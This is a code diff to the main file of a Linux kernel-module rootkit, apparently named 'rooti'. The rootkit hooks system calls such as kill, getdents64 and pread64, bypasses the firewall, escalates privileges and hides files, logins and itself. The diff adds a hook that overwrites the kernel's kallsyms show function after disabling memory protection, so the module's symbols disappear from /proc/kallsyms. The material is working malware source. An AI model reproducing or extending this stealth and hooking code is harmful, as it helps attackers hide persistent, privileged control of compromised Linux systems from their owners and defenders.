@@ -9,18 +9,22 @@
 #include <linux/threads.h>
 #include <linux/file.h>
 #include <linux/filter.h>
+#include <linux/ftrace.h>
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "capabilities/privilege.h"
 #include "capabilities/unloading.h"
 #include "capabilities/fw_bypass.h"
 #include "capabilities/hiding/dentry.h"
-#include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "hooking.h"
 #include "state.h"
 #include "utils.h"
 #include "config.h"
+
+#ifndef ROOTI_DEBUG_SHOWME
+#include "capabilities/hiding/module.h"
+#endif
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Omri Ben Zikri");
@@ -54,6 +58,10 @@ static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 static void (*orig_do_exit)(long code);
+
+#ifndef ROOTI_DEBUG_SHOWME
+static int (*orig_kallsyms_seq_show)(struct seq_file *m, void *p);
+#endif
 
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
@@ -226,10 +234,36 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     return len;
 }
 
-/* I am not going for full coverage of every possible system call that should be tampered with
- * in order (because that would take eternity). Instead, this rootkit only messes with system calls
- which are used by the common Linux utils (ls, ps, ss, who...) */
-struct rooti_func_hook func_hooks[] = {
+#ifndef ROOTI_DEBUG_SHOWME
+static int hook_kallsyms_seq_show(struct seq_file *m, void *p)
+{
+    // Copied from kernel
+    struct kallsym_iter {
+    	loff_t pos;
+    	loff_t pos_mod_end;
+    	loff_t pos_ftrace_mod_end;
+    	loff_t pos_bpf_end;
+    	unsigned long value;
+    	unsigned int nameoff;
+    	char type;
+    	char name[KSYM_NAME_LEN];
+    	char module_name[MODULE_NAME_LEN];
+    	int exported;
+    	int show_value;
+    };
+
+    struct kallsym_iter *iter = m->private;
+
+    if (iter->module_name[0] &&
+        strncmp(iter->module_name, THIS_MODULE->name, MODULE_NAME_LEN) == 0) {
+            return 0;
+    }
+
+    return orig_kallsyms_seq_show(m, p);
+}
+#endif
+
+struct rooti_func_hook rooti_func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
@@ -267,9 +301,9 @@ static int __init rooti_init(void)
         return err;
     }
 
-    err = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
+    err = rooti_install_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
     if (err) {
-        ROOTI_DEBUG("rooti_install_hooks() failed: %d", err);
+        ROOTI_DEBUG("rooti_install_func_hooks() failed: %d", err);
         return err;
     }
 
@@ -283,6 +317,14 @@ static int __init rooti_init(void)
     err = rooti_hideme();
     if (err)
         return err;
+
+    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, -ENOENT);
+
+    orig_kallsyms_seq_show = __kallsyms_op->show;
+
+    rooti_unprotect_memory();
+    __kallsyms_op->show = hook_kallsyms_seq_show;
+    rooti_protect_memory();
 #endif
 
     ROOTI_DEBUG("init");
@@ -292,7 +334,15 @@ static int __init rooti_init(void)
 
 static void __exit rooti_exit(void)
 {
-    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
+#ifndef ROOTI_DEBUG_SHOWME
+    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, );
+
+    rooti_unprotect_memory();
+    __kallsyms_op->show = orig_kallsyms_seq_show;
+    rooti_protect_memory();
+#endif
+
+    rooti_uninstall_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
     rooti_uninstall_fw_bypass_hooks();
 
     // Release any remaining records
